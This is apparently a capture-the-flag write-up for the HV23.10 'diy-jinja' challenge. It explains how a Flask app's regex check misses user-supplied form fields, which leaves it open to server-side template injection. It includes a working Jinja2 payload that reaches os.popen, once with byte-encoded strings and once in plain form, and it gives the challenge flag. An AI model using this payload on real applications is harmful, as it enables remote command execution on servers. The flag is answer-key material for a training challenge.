## [HV23.10] diy‑jinja (coderion)
### Description
> We've heard you like to create your own forms. With SANTA (Secure and New Template Automation), you can upload your own jinja templates and have the convenience of HTML input fields to have your friends fill them out! Obviously 100% secure and even with anti-tampering protection!
### Solution
When looking at the sourcecode, you quickly see that this is a flask webapp with jinja2 templates. When further analysing the code one can notice that there is some injecting protection with a regex. The regex **{{(.*?)}}** matches all templates which then get further checked by this regex **^[a-z ]+$**, which only allows lowercase a-z and space. But you can notice that the field actually dont get checked but also rendered with render_template. With this you can perform a STI(Serverside Template Injection). One limitation is that you can't use any strings but this can easily be solved by just converting them to integers.   
File: 
```jinja
{{ a }}
```
Field a:
```python
{{ self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([111, 115]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([99, 97, 116, 32, 47, 97, 112, 112, 47, 102, 108, 97, 103, 46, 116, 120, 116]).decode()).read() }}
```
Cleaned up:
```py
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
```
Or you can just execute the [solve.py](./solve.py)

Flag: **HV23{us3r_suppl13d_j1nj4_1s_4lw4ys_4_g00d_1d34}**  